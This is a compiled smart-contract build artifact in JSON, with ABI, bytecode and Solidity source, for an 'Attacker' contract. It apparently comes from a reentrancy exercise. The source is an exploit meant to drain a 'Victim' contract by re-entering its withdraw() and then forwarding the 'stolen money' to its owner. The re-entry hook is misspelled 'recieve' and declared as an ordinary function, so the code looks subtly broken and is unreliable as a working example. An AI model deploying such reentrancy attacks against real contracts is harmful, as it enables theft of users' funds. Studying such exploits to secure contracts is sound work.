{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "poorvictim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "internalType": "contract Victim",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "recieve",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdrawstolenmoney",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60803461007a57601f61036138819003918201601f19168301916001600160401b0383118484101761007f5780849260209460405283398101031261007a57516001600160a01b0381169081900361007a5760018060a01b03193381600154161760015560005416176000556040516102cb90816100968239f35b600080fd5b634e487b7160e01b600052604160045260246000fdfe6080604081815260048036101561001557600080fd5b600092833560e01c908163930c20031461024757508063979fd9f2146101bc5780639e5faafc146100d05763a9e10bf21461004f57600080fd5b8291826003193601126100cc5782546001600160a01b031691670de0b6b3a76400008331101561007e57505050f35b823b156100c7578151633ccfd60b60e01b81529284918491829084905af19081156100be57506100ab5750f35b6100b49061026b565b6100bb5780f35b80fd5b513d84823e3d90fd5b505050fd5b5050fd5b508290816003193601126101b857670de0b6b3a7640000928334106101795782546001600160a01b03908116803b1561017557849084845180988193630d0e30db60e41b83525af1801561016b57610157575b83809550541691823b156100c7578151633ccfd60b60e01b81529284918491829084905af19081156100be57506100ab5750f35b9290936101639061026b565b918390610123565b82513d86823e3d90fd5b8480fd5b906020606492519162461bcd60e51b8352820152601960248201527814d95b99081b59481cdbdb5948115512081d1bc81cdd185c9d603a1b6044820152fd5b5080fd5b50346102435782600319360112610243576001546001600160a01b0316903382900361020f575082808080934790828215610206575bf1156101fc575080f35b51903d90823e3d90fd5b506108fc6101f2565b606490602084519162461bcd60e51b8352820152600e60248201526d4e6f7420796f7572206d6f6e657960901b6044820152fd5b8280fd5b8490346101b857816003193601126101b85790546001600160a01b03168152602090f35b67ffffffffffffffff811161027f57604052565b634e487b7160e01b600052604160045260246000fdfea26469706673582212206f5339b2a2d189b5f45bd0a20f60c3d1b80dd468ebe16a7f51550d78cbd8d7d264736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.19;\nimport \"./Victim.sol\";\ncontract Attacker {\n\n    Victim public victim;\n    address private owner;\n\n    constructor(address poorvictim){\n        owner = msg.sender;\n        victim = Victim(poorvictim);\n    }\n\n    function attack() public payable {\n        require(msg.value>=1 ether,\"Send me some ETH to start\");\n        victim.deposit{value: 1 ether}();\n\n        victim.withdraw();\n\n    }\n\n    function recieve() public payable{\n        if(address(victim).balance>=1 ether){\n            victim.withdraw();\n        }\n    }\n\n    function withdrawstolenmoney() public {\n        require(msg.sender == owner ,\"Not your money\");\n        payable(owner).transfer(address(this).balance);\n    }\n}",
  "sourcePath": "/home/aca/smartcontracts/reentrancy/contracts/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-04-21T17:39:55.147Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}